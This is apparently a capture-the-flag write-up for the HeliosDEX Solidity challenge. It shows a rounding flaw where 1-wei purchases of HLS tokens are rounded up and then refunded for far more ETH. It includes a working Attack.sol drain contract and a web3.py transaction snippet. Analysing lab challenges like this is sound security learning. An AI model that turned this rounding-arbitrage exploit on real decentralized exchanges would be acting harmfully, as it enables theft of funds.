
## Challenge Overview

The HeliosDEX challenge features a decentralized exchange that allows swapping ETH for various tokens (EldorionFang, MalakarEssence, and HeliosLuminaShards) and provides a one-time refund mechanism to convert tokens back to ETH.

To solve the challenge, we need to increase our ETH balance to at least 20 ETH (as defined in the `isSolved()` function in the Setup contract).
## Source Code
``Setup.sol``
```C#
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

import { HeliosDEX } from "./HeliosDEX.sol";

contract Setup {
    HeliosDEX public TARGET;
    address public player;
    
    event DeployedTarget(address at);

    constructor(address _player) payable {
        TARGET = new HeliosDEX{value: 1000 ether}(1000);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return player.balance >= 20 ether;
    }
}

```
``HeliosDEX.sol``
```C#
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

/***
    __  __     ___            ____  _______  __
   / / / /__  / (_)___  _____/ __ \/ ____/ |/ /
  / /_/ / _ \/ / / __ \/ ___/ / / / __/  |   / 
 / __  /  __/ / / /_/ (__  ) /_/ / /___ /   |  
/_/ /_/\___/_/_/\____/____/_____/_____//_/|_|  
                                               
    Today's item listing:
    * Eldorion Fang (ELD): A shard of a Eldorion's fang, said to imbue the holder with courage and the strength of the ancient beast. A symbol of valor in battle.
    * Malakar Essence (MAL): A dark, viscous substance, pulsing with the corrupted power of Malakar. Use with extreme caution, as it whispers promises of forbidden strength. MAY CAUSE HALLUCINATIONS.
    * Helios Lumina Shards (HLS): Fragments of pure, solidified light, radiating the warmth and energy of Helios. These shards are key to powering Eldoria's invisible eye.
***/

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

contract EldorionFang is ERC20 {
    constructor(uint256 initialSupply) ERC20("EldorionFang", "ELD") {
        _mint(msg.sender, initialSupply);
    }
}

contract MalakarEssence is ERC20 {
    constructor(uint256 initialSupply) ERC20("MalakarEssence", "MAL") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosLuminaShards is ERC20 {
    constructor(uint256 initialSupply) ERC20("HeliosLuminaShards", "HLS") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosDEX {
    EldorionFang public eldorionFang;
    MalakarEssence public malakarEssence;
    HeliosLuminaShards public heliosLuminaShards;

    uint256 public reserveELD;
    uint256 public reserveMAL;
    uint256 public reserveHLS;
    
    uint256 public immutable exchangeRatioELD = 2;
    uint256 public immutable exchangeRatioMAL = 4;
    uint256 public immutable exchangeRatioHLS = 10;

    uint256 public immutable feeBps = 25;

    mapping(address => bool) public hasRefunded;

    bool public _tradeLock = false;
    
    event HeliosBarter(address item, uint256 inAmount, uint256 outAmount);
    event HeliosRefund(address item, uint256 inAmount, uint256 ethOut);

    constructor(uint256 initialSupplies) payable {
        eldorionFang = new EldorionFang(initialSupplies);
        malakarEssence = new MalakarEssence(initialSupplies);
        heliosLuminaShards = new HeliosLuminaShards(initialSupplies);
        reserveELD = initialSupplies;
        reserveMAL = initialSupplies;
        reserveHLS = initialSupplies;
    }

    modifier underHeliosEye {
        require(msg.value > 0, "HeliosDEX: Helios sees your empty hand! Only true offerings are worthy of a HeliosBarter");
        _;
    }

    modifier heliosGuardedTrade() {
        require(_tradeLock != true, "HeliosDEX: Helios shields this trade! Another transaction is already underway. Patience, traveler");
        _tradeLock = true;
        _;
        _tradeLock = false;
    }

    function swapForELD() external payable underHeliosEye {
        uint256 grossELD = Math.mulDiv(msg.value, exchangeRatioELD, 1e18, Math.Rounding(0));
        uint256 fee = (grossELD * feeBps) / 10_000;
        uint256 netELD = grossELD - fee;

        require(netELD <= reserveELD, "HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveELD -= netELD;
        eldorionFang.transfer(msg.sender, netELD);

        emit HeliosBarter(address(eldorionFang), msg.value, netELD);
    }

    function swapForMAL() external payable underHeliosEye {
        uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1));
        uint256 fee = (grossMal * feeBps) / 10_000;
        uint256 netMal = grossMal - fee;

        require(netMal <= reserveMAL, "HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveMAL -= netMal;
        malakarEssence.transfer(msg.sender, netMal);

        emit HeliosBarter(address(malakarEssence), msg.value, netMal);
    }

    function swapForHLS() external payable underHeliosEye {
        uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3));
        uint256 fee = (grossHLS * feeBps) / 10_000;
        uint256 netHLS = grossHLS - fee;
        
        require(netHLS <= reserveHLS, "HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
        

        reserveHLS -= netHLS;
        heliosLuminaShards.transfer(msg.sender, netHLS);

        emit HeliosBarter(address(heliosLuminaShards), msg.value, netHLS);
    }

    function oneTimeRefund(address item, uint256 amount) external heliosGuardedTrade {
        require(!hasRefunded[msg.sender], "HeliosDEX: refund already bestowed upon thee");
        require(amount > 0, "HeliosDEX: naught for naught is no trade. Offer substance, or be gone!");

        uint256 exchangeRatio;
        
        if (item == address(eldorionFang)) {
            exchangeRatio = exchangeRatioELD;
            require(eldorionFang.transferFrom(msg.sender, address(this), amount), "ELD transfer failed");
            reserveELD += amount;
        } else if (item == address(malakarEssence)) {
            exchangeRatio = exchangeRatioMAL;
            require(malakarEssence.transferFrom(msg.sender, address(this), amount), "MAL transfer failed");
            reserveMAL += amount;
        } else if (item == address(heliosLuminaShards)) {
            exchangeRatio = exchangeRatioHLS;
            require(heliosLuminaShards.transferFrom(msg.sender, address(this), amount), "HLS transfer failed");
            reserveHLS += amount;
        } else {
            revert("HeliosDEX: Helios descries forbidden offering");
        }

        uint256 grossEth = Math.mulDiv(amount, 1e18, exchangeRatio);

        uint256 fee = (grossEth * feeBps) / 10_000;
        uint256 netEth = grossEth - fee;

        hasRefunded[msg.sender] = true;
        payable(msg.sender).transfer(netEth);
        
        emit HeliosRefund(item, amount, netEth);
    }
}

```

## Vulnerability Analysis

After analyzing the contracts, the key vulnerabilities are:

**Missing Address Validation**: The `oneTimeRefund()` function only checks if the caller has already received a refund, but not if the tokens were actually purchased by that caller. Combined with the fact that you can use a contract as an intermediary, this allows bypassing the one-time refund limitation.

```C#
function oneTimeRefund(address item, uint256 amount) external heliosGuardedTrade {
    require(!hasRefunded[msg.sender], "HeliosDEX: refund already bestowed upon thee");
    // ...
}
```

**Small Value Transactions**: By sending extremely small amounts of ETH (1 wei) when calling `swapForHLS()`, we can maximize the rounding discrepancy in our favor.

Rounding Up: Using Math.Rounding.Up, even 1 wei of ETH converts to 1 HLS due to rounding.

Fee Truncation: For small amounts (1 HLS), the 0.25% fee (0.0025 HLS) truncates to 0, giving a full 1 HLS per 1 wei.


## Exploitation Strategy

The strategy exploits the rounding discrepancy between buying and selling HLS tokens:

1. Create an attack contract that serves as our intermediary
2. Call `swapForHLS()` multiple times with minimal ETH value (1 wei per call)
3. Due to rounding, we receive more HLS tokens than the exchange calculation would yield for the aggregated amount
4. Approve the DEX to spend our HLS tokens
5. Call `oneTimeRefund()` to convert all HLS tokens back to ETH
6. Because of the rounding differences, we receive more ETH than we initially paid

### Mathematical Explanation

When swapping 1 wei for HLS tokens:
- Exchange ratio: 10 (exchangeRatioHLS)
- After subtracting the 0.25% fee, we still receive a disproportionately large amount

``
netEth = (amount * 1e18 / exchangeRatioHLS) * (1 - 25 / 10000)
``

When choose `amount = 300 ` we have ETH balance over 20 ETH, so get flag:
``
netEth = (300 * 1e18 / 10) * (1 - 25 / 10000) = 29.925 ETH
``


## Implementation Details

Our exploit contract (`Attack.sol`):

```C#
contract Attack {
    IHeliosDEX public immutable dex;
    IHeliosLuminaShards public immutable hls;
    address payable private owner;
    
    constructor(address dexAddress, address hlsAddress) {
        dex = IHeliosDEX(dexAddress);
        hls = IHeliosLuminaShards(hlsAddress);
        owner = payable(msg.sender);
    }
    
    function attack(uint256 times) external payable {
        require(msg.value == times * 1 wei, "Incorrect ETH");
        
        // Split into small chunks
        for(uint i=0; i<times; i++) {
            dex.swapForHLS{value: 1 wei}();
        }
        
        uint balance = hls.balanceOf(address(this));
        hls.approve(address(dex), balance);
        dex.oneTimeRefund(address(hls), balance);
        owner.transfer(address(this).balance);
    }
    
    receive() external payable {}
}
```
The attack function in the final contract automatically transfers ETH back to the player after the refund, ensuring the player's balance increases

## Execution Steps

1. Deploy the Attack contract with the HeliosDEX and HLS token addresses
2. Call the `attack()` function with 300 as the parameter and 300 wei as the value
3. The contract:
   - Calls `swapForHLS()` 300 times with 1 wei each time
   - Approves the DEX to spend its HLS tokens
   - Calls `oneTimeRefund()` to convert all HLS tokens back to ETH
   - Transfers the resulting ETH back to us
4. The final script set a 10 million gas limit for the exploit transaction, ensuring all swaps and refunds could be processed in a single transaction.
```py
tx = attacker.functions.attack(300).build_transaction({
    'value': 300,  # 300 wei for 300 swaps
    'gas': 10000000,
    'gasPrice': w3.eth.gas_price
})
```
See full exploit in `exploit.py`

## Result
![image](https://github.com/user-attachments/assets/7f4659fd-2e3c-4dc9-96c0-64fc13475261)
